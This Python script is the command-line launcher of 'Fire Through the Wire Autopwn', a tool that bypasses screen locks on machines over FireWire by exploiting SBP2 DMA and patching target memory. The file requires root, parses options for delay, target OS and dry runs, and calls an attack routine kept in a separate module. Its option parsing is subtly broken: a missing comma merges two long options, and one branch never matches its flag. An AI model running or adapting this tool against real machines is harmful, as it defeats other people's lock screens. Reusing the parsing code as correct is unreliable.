#!/usr/bin/env python3
'''
Created on Oct 15, 2011

@author: carsten
'''
import sys
import json
import getopt
import ftwautopwn.settings as settings
from ftwautopwn.util import msg, fail
from ftwautopwn import screenlock
import os


def main(argv):
    settings.encoding = sys.getdefaultencoding()
    
    if not os.geteuid() == 0:
        fail("You must be root to run FTWA.")
    
    # Load available JSON targets
    #===========================================================================
    # configuration = open(settings.configfile, 'r')
    # targets = json.load(configuration)
    # configuration.close()
    #===========================================================================
    targets = settings.targets
    
    # Print banner
    print('Fire Through the Wire Autopwn v.0.1.0\n'\
          'by Carsten Maartmann-Moe aka ntropy <carsten@carmaa.com> 2011\n'\
          '\n'\
          'For updates, check out https://github.com/carmaa/FTWAutopwn\n')
    
    try:
        opts, args = getopt.getopt(argv, 'f:hlvt:d:n', ['file=', 'help', 'list'  'verbose', 'technique=', 'delay=', 'no-write'])
    except getopt.GetoptError as err:
        msg('!', err)
        usage(argv[0])
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage(argv[0])
            sys.exit()
        elif opt in ('-f', '--file'):
            settings.filemode = True
            settings.filename = str(arg)
        elif opt in ('-l', '--list'):
            msg('*', 'Available targets:')
            for n, target in enumerate(targets, 1):
                msg(n, target.get("name"))
            sys.exit()
        elif opt in ('-v', '--verbose'):
            settings.verbose = True
        elif opt in ('-target', '--technique'):
            # TODO
            # settings.target = unlock.select_target(ctx.config, int(arg))
            pass
        elif opt in ('-d', '--delay'):
            settings.fw_delay = int(arg)
        elif opt in ('-n', '--no-write'):
            settings.dry_run = True
        else:
            assert False, 'Unhandled option: ' + opt
    
    # TODO: Detect devices
    
    screenlock.attack(targets)
    
    
def usage(execname):
    print('''Usage: ''' + execname + ''' [OPTIONS]

Attack machines over the IEEE1394 interface by exploiting SBP2 DMA.

    -d --delay=TIME:      Delay attack by TIME seconds. This is useful in order
                          to guarantee that the target machine has successfully
                          granted the host DMA before attacking. If the
                          attack fails, try to increase this value. Default
                          delay is 15 seconds.
    -f --file=FILE:       Use a file instead of FireWire bus data as input; for
                          example to facilitate attacks on VMware machines or
                          to ease testing and signature generation efforts
    -h, --help:           Displays this message
    -l, --list:           Lists available target operating systems
    -n, --no-write:       Dry run, do not write back to memory
    -t TARGET, --technique=TARGET:
                          Specify target operating system (use --list to list 
                          available targets)
    -v/--verbose:         Verbose mode''')
    

if __name__ == '__main__':
    main(sys.argv[1:])